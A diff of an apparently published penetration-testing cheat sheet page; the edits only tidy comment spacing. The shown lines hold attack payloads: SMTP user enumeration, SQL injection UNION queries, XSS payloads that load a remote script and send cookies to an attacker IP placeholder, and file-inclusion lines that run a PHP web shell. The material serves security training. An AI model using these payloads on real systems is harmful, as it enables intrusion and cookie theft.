@@ -1742,7 +1742,7 @@ dnsenum <span class="nt">--dnsserver</span> &lt;nameserver&gt; <span class="nt">
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre>curl <span class="nt">-k</span> <span class="s1">'imaps://&lt;FQDN/IP&gt;'</span> <span class="nt">--user</span> &lt;user&gt;:&lt;password&gt;   <span class="c"># Log in to the IMAPS service using cURL</span>
-openssl s_client <span class="nt">-connect</span> &lt;IP&gt;:&lt;imaps/pop3s&gt;           <span class="c">#  Connect to the IMAPS/POP3S service</span>
+openssl s_client <span class="nt">-connect</span> &lt;IP&gt;:&lt;imaps/pop3s&gt;           <span class="c"># Connect to the IMAPS/POP3S service</span>
 </pre></td></tr></tbody></table></code></div></div>
 <h4 id="-snmp"><span class="me-2">💻 SNMP</span><a href="#-snmp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
 
@@ -1990,8 +1990,8 @@ subfinder <span class="nt">-d</span> &lt;domain.tld&gt; <span class="nt">-v</spa
 2
 3
 4
-</pre></td><td class="rouge-code"><pre>host <span class="nt">-t</span> MX &lt;domain.tld&gt;    <span class="c">#  DNS lookup for mailservers for the specified domain</span>
-telnet  &lt;IP&gt; 25            <span class="c">#  Connect to the SMTP server</span>
+</pre></td><td class="rouge-code"><pre>host <span class="nt">-t</span> MX &lt;domain.tld&gt;     <span class="c"># DNS lookup for mailservers for the specified domain</span>
+telnet &lt;IP&gt; 25              <span class="c"># Connect to the SMTP server</span>
 smtp-user-enum <span class="nt">-M</span> RCPT <span class="nt">-U</span> userlist.txt <span class="nt">-D</span> &lt;domain.tld&gt; <span class="nt">-t</span> &lt;IP&gt; <span class="c"># SMTP user enumeration using the RCPT command against the specified host</span>
 python3 o365spray.py <span class="nt">--validate</span> <span class="nt">--domain</span> &lt;domain.tdl&gt;   <span class="c"># Verify the usage of Office365 for the specified domain</span>
 </pre></td></tr></tbody></table></code></div></div>
@@ -2109,7 +2109,7 @@ UNION <span class="k">select </span>username, 2, 3, 4 from passwords-- - <span c
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre>admin<span class="s1">' UNION select 1,database(),2,3-- -    # Current database name
-admin'</span> UNION <span class="k">select </span>1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -  <span class="c">#  List all databases</span>
+admin'</span> UNION <span class="k">select </span>1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -  <span class="c"># List all databases</span>
 </pre></td></tr></tbody></table></code></div></div>
 <h4 id="-payload"><span class="me-2">💥 Payload</span><a href="#-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
 <div class="language-bash highlighter-rouge"><div class="code-header">
@@ -2142,7 +2142,7 @@ cn<span class="s1">' UNION SELECT 1, variable_name, variable_value, 4 FROM infor
 5
 </pre></td><td class="rouge-code"><pre>&lt;script&gt;alert<span class="o">(</span>window.origin<span class="o">)</span>&lt;/script&gt;       <span class="c"># Basic XSS Payload</span>
 &lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">""</span> <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span>window.origin<span class="o">)&gt;</span>   <span class="c"># HTML-based XSS Payload</span>
-&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://&lt;OUR_IP&gt;/script.js"</span><span class="o">&gt;</span>&lt;/script&gt;   <span class="c">#  Load remote script</span>
+&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://&lt;OUR_IP&gt;/script.js"</span><span class="o">&gt;</span>&lt;/script&gt;   <span class="c"># Load remote script</span>
 &lt;script&gt;new Image<span class="o">()</span>.src<span class="o">=</span><span class="s1">'http://&lt;OUR_IP&gt;/index.php?c='</span>+document.cookie&lt;/script&gt; <span class="c"># Send Cookie details to us</span>
 python xsstrike.py <span class="nt">-u</span> <span class="s2">"http://&lt;IP&gt;:&lt;PORT&gt;/index.php?task=test"</span>  <span class="c">#  Run xsstrike on a url parameter</span>
 </pre></td></tr></tbody></table></code></div></div>
@@ -2165,7 +2165,7 @@ python xsstrike.py <span class="nt">-u</span> <span class="s2">"http://&lt;IP&gt
 /index.php?language<span class="o">=</span>php://filter/read<span class="o">=</span>convert.base64-encode/resource<span class="o">=</span>config <span class="c"># Read PHP with base64 filter</span>
 /index.php?language<span class="o">=</span>data://text/plain<span class="p">;</span><span class="nb">base64</span>,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd<span class="o">=</span><span class="nb">id</span>  <span class="c"># RCE with data wrapper</span>
 curl <span class="nt">-s</span> <span class="s2">"http://&lt;IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</span>  <span class="c"># RCE with expect wrapper</span>
-/index.php?language<span class="o">=</span>http://&lt;OUR_IP&gt;:&lt;PORT&gt;/shell.php&amp;cmd<span class="o">=</span><span class="nb">id</span> <span class="c"># Include remote PHP web shell</span>
+/index.php?language<span class="o">=</span>http://&lt;OUR_IP&gt;:&lt;PORT&gt;/shell.php&amp;cmd<span class="o">=</span><span class="nb">id</span>  <span class="c"># Include remote PHP web shell</span>
 </pre></td></tr></tbody></table></code></div></div>
 <p class="back-to-top">
   <a href="#top" aria-label="Back to top">Back to top ↑</a>
